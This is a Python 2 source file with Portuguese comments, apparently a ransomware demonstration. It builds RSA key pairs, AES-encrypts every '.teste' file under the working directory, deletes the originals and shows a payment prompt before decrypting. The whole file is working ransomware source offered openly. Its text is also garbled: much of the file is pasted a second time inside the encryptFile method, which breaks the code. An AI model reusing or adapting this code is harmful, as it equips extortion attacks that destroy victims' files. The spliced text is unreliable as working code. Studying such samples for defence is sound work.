#!/usr/bin/python
# -*- coding: utf-8 -*-

import os, zlib
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def _pad(s):
    bs = 32
    return s + (bs - len(s) % bs) * chr(bs - len(s) % bs)

def _unpad(s):
    return s[:-ord(s[len(s)-1:])]

class Attack():
    def __init__(self):
        key_object = RSA.generate(2048)
        client_private_key = key_object.exportKey('PEM')

        public_object = key_object.publickey()
        client_public_key = public_object.exportKey('PEM')

        #Adiciona a chave privada do cliente a um arquivo.pem
        with open('Client-privateKey.pem', 'w+') as file:
            file.write(client_private_key)
            file.close()
        print ("[*] Chave privada RSA do cliente gerada com sucesso")

        #Adiciona a chave pública do cliente a um arquivo.pem
        with open('Client-publicKey.pem', 'w+') as file:
            file.write(client_public_key)
            file.close()
        print ("[*] Chave pública RSA do cliente gerada com sucesso")

        encrypted_client_key = self.encryptClientPrivateKey()
        self.Request_DecryptClientPrivateKey(encrypted_client_key);
        self.startAttack()
    @staticmethod
    def encryptData(data, public_key):
        #Importa a chave pública utilizada para criptografar PKCS1_OAEP
        rsa_key = RSA.importKey(public_key)
        rsa_key = PKCS1_OAEP.new(rsa_key)
        #Comprime o dado
        data = zlib.compress(data)
        chunk_size = 214
        offset = 0
        end_loop = False
        encrypted =  ""
        while not end_loop:
            chunk = data[offset:offset + chunk_size]
            if len(chunk) % chunk_size != 0:
                end_loop = True
                chunk += " " * (chunk_size - len(chunk))
            encrypted += rsa_key.encrypt(chunk)
            offset += chunk_size
        return encrypted

    @staticmethod
    def decryptData(encryptedData):
        file_serv = open("Server-privateKey.pem", "r")
        private_key = file_serv.read()
        file_serv.close()

        rsa_key = RSA.importKey(private_key)
        rsa_key = PKCS1_OAEP.new(rsa_key)

        chunk_size = 256
        offset = 0
        decrypted = ""
        while offset < len(encryptedData):
            chunk = encryptedData[offset: offset + chunk_size]
            decrypted += rsa_key.decrypt(chunk)
            offset += chunk_size
        return zlib.decompress(decrypted)

    def deleteClientPrivateKey(self):
        if os.path.exists("Client-privateKey.pem"):
            os.remove("Client-privateKey.pem")
            return True
        else:
            return False

    def encryptClientPrivateKey(self):
        file_serv = open("Server-publicKey.pem", "r")
        server_public_key = file_serv.read()
        file_serv.close()

        file_client = open("Client-privateKey.pem", "r")
        client_private_key = file_client.read()
        file_client.close()
        encrypted_client_key = self.encryptData(client_private_key, server_public_key)

        if self.deleteClientPrivateKey():
            print ("[*] Chave privada RSA do cliente deletada com sucesso")
        else:
            print ("[*] Erro ao deletar chave privada RSA do cliente")
            exit(0)
        try:
            encrypted_keyFile = open("Client-privateKey.pem.CRY", "w+")
            encrypted_keyFile.write(encrypted_client_key)
            encrypted_keyFile.close()
        except:
            print("[*] Erro ao armazenar a chave privada criptografada")
            exit(0)

        print ("[*] Chave privada RSA do cliente criptografada com sucesso")
        print ("[*] Chave privada RSA do cliente armazenada em \"Client-privateKey.pem.CRY\"")
        return encrypted_client_key

    def Request_DecryptClientPrivateKey(self, encryptedKey):
        decrypted_client_key = self.decryptData(encryptedKey)
        print ("[*] Chave privada RSA do cliente descriptografada com sucesso")
        with open('Client-privateKey.pem', 'w+') as file:
            file.write(decrypted_client_key)
            file.close()
        print ("[*] Arquivo 'Client-privateKey.pem' gerado")

        return decrypted_client_key

    def encryptFile(self, filename):
        iv = Random.new().read(AES.block_size)
        key = os.urandom(32)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        with open(filename, "r") as unc_file:
            plaintext = unc_file.read()#!/usr/bin/python
# -*- coding: utf-8 -*-

import os, zlib
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def _pad(s):
    bs = 32
    return s + (bs - len(s) % bs) * chr(bs - len(s) % bs)

def _unpad(s):
    return s[:-ord(s[len(s)-1:])]

class Attack():
    def __init__(self):
        key_object = RSA.generate(2048)
        client_private_key = key_object.exportKey('PEM')

        public_object = key_object.publickey()
        client_public_key = public_object.exportKey('PEM')

        #Adiciona a chave privada do cliente a um arquivo.pem
        with open('Client-privateKey.pem', 'w+') as file:
            file.write(client_private_key)
            file.close()
        print ("[*] Chave privada RSA do cliente gerada com sucesso")

        #Adiciona a chave pública do cliente a um arquivo.pem
        with open('Client-publicKey.pem', 'w+') as file:
            file.write(client_public_key)
            file.close()
        print ("[*] Chave pública RSA do cliente gerada com sucesso")

        encrypted_client_key = self.encryptClientPrivateKey()
        self.Request_DecryptClientPrivateKey(encrypted_client_key);
        self.startAttack()
    @staticmethod
    def encryptData(data, public_key):
        #Importa a chave pública utilizada para criptografar PKCS1_OAEP
        rsa_key = RSA.importKey(public_key)
        rsa_key = PKCS1_OAEP.new(rsa_key)
        #Comprime o dado
        data = zlib.compress(data)
        chunk_size = 214
        offset = 0
        end_loop = False
        encrypted =  ""
        while not end_loop:
            chunk = data[offset:offset + chunk_size]
            if len(chunk) % chunk_size != 0:
                end_loop = True
                chunk += " " * (chunk_size - len(chunk))
            encrypted += rsa_key.encrypt(chunk)
            offset += chunk_size
        return encrypted

    @staticmethod
    def decryptData(encryptedData):
        file_serv = open("Server-privateKey.pem", "r")
        private_key = file_serv.read()
        file_serv.close()

        rsa_key = RSA.importKey(private_key)
        rsa_key = PKCS1_OAEP.new(rsa_key)

        chunk_size = 256
        offset = 0
        decrypted = ""
        while offset < len(encryptedData):
            chunk = encryptedData[offset: offset + chunk_size]
            decrypted += rsa_key.decrypt(chunk)
            offset += chunk_size
        return zlib.decompress(decrypted)

    def deleteClientPrivateKey(self):
        if os.path.exists("Client-privateKey.pem"):
            os.remove("Client-privateKey.pem")
            return True
        else:
            return False

    def encryptClientPrivateKey(self):
        file_serv = open("Server-publicKey.pem", "r")
        server_public_key = file_serv.read()
        file_serv.close()

        file_client = open("Client-privateKey.pem", "r")
        client_private_key = file_client.read()
        file_client.close()
        encrypted_client_key = self.encryptData(client_private_key, server_public_key)

        if self.deleteClientPrivateKey():
            print ("[*] Chave privada RSA do cliente deletada com sucesso")
        else:
            print ("[*] Erro ao deletar chave privada RSA do cliente")
            exit(0)
        try:
            encrypted_keyFile = open("Client-privateKey.pem.CRY", "w+")
            encrypted_keyFile.write(encrypted_client_key)
            encrypted_keyFile.close()
        except:
            print("[*] Erro ao armazenar a chave privada criptografada")
            exit(0)

        print ("[*] Chave privada RSA do cliente criptografada com sucesso")
        print ("[*] Chave privada RSA do cliente armazenada em \"Client-privateKey.pem.CRY\"")
        return encrypted_client_key

    def Request_DecryptClientPrivateKey(self, encryptedKey):
        decrypted_client_key = self.decryptData(encryptedKey)
        print ("[*] Chave privada RSA do cliente descriptografada com sucesso")
        with open('Client-privateKey.pem', 'w+') as file:
            file.write(decrypted_client_key)
            file.close()
        print ("[*] Arquivo 'Client-privateKey.pem' gerado")

            plaintext = _pad(plaintext)
            unc_file.close()
        crypt = (iv + cipher.encrypt(plaintext))
        with open(filename + ".CRY", 'w') as enc_file:
            enc_file.write(crypt)
            enc_file.close()

        return key

    def decryptAESKey(self, key, client_private_key):
        decrypted_aes_key = client_private_key.decrypt(key)
        return decrypted_aes_key

    def decryptFile(self, filename, key):
        with open(filename, 'r') as encrypted_file:
            cipher_text = encrypted_file.read()
            encrypted_file.close()
        iv = cipher_text[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(cipher_text[AES.block_size:])
        with open(filename[:-4], "w+") as decrypted_file:
            decrypted_file.write(plaintext)
            decrypted_file.close()



    def startAttack(self):
        ext = [".teste"]
        files_to_enc = []
        dir_cwd = os.getcwd()
        encrypted_aes_keys = []
        for root, dir, files in os.walk(dir_cwd):
            for file in files:
                if file.endswith(tuple(ext)):
                    files_to_enc.append(os.path.join(root, file))

        print ("[!] Criptografando todos os arquivos do diretório {}".format(dir_cwd))
        print ("[!] Arquivos escolhidos para criptografia {}".format(files_to_enc))

        # Recuperar a chave pública do cliente
        file_c = open("Client-publicKey.pem", "r")
        client_public_key = file_c.read()
        file_c.close()
        client_public_key = RSA.importKey(client_public_key)
        client_public_key = PKCS1_OAEP.new(client_public_key)

        for file in files_to_enc:
            key = self.encryptFile(file)
            # Criptografar a chave AES 256bits usada
            dict_to_add = {'file': file + ".CRY", 'key': client_public_key.encrypt(key)}
            encrypted_aes_keys.append(dict_to_add)
            if os.path.exists(file):
                os.remove(file)
            else:
                pass
            print ("[*] Arquivo {} criptografado com sucesso".format(file))

        if os.path.exists("Client-privateKey.pem"):
            os.remove("Client-privateKey.pem")
        else:
            pass
        option = raw_input("Digite p para efetuar o pagamento, para abortar [P/N]: ")
        if option == "p" or option == "P":
            encrypted_keyFile = open("Client-privateKey.pem.CRY", "r")
            encrypted_key = encrypted_keyFile.read()
            encrypted_keyFile.close()
            print ("[*] Pagamento efetuado. Iniciar sequência de descriptografia")
            print ("[!] Requisitar chave privada ao server...")
            client_private_key = self.Request_DecryptClientPrivateKey(encrypted_key)
            client_private_key = RSA.importKey(client_private_key)
            client_private_key = PKCS1_OAEP.new(client_private_key)
            ext = [".CRY"]
            files_to_dec = []
            for root, dir, files in os.walk(dir_cwd):
                for file in files:
                    if file.endswith(tuple(ext)):
                        files_to_dec.append(os.path.join(root, file))

            print ("[!] Descriptografando todos os arquivos do diretório {}".format(dir_cwd))
            print ("[!] Arquivos que serão descriptografados {}".format(files_to_enc))
            for file in files_to_dec:
                print ("[!] Descriptografando arquivo {}".format(file))
                for line in encrypted_aes_keys:
                    if line['file'] == file:
                        decrypted_aes_key = self.decryptAESKey(line['key'], client_private_key)
                        self.decryptFile(file, decrypted_aes_key)
                        print ("[*] Arquivo {} descriptografado com sucesso".format(file))
            ext = [".CRY"]

            for root, dir, files in os.walk(dir_cwd):
                for file in files:
                    if file.endswith(tuple(ext)):
                        if os.path.exists(file):
                            os.remove(file)
                        else:
                            pass

            print ("[*] Fim".format(file))



if __name__ == '__main__':
    a = Attack()

    if os.path.exists("Client-privateKey.pem"):
        os.remove("Client-privateKey.pem")
    else:
        pass
    if os.path.exists("Client-publicKey.pem"):
        os.remove("Client-publicKey.pem")
    else:
        pass
    if os.path.exists("Client-privateKey.pem.CRY"):
        os.remove("Client-privateKey.pem.CRY")
    else:
        pass
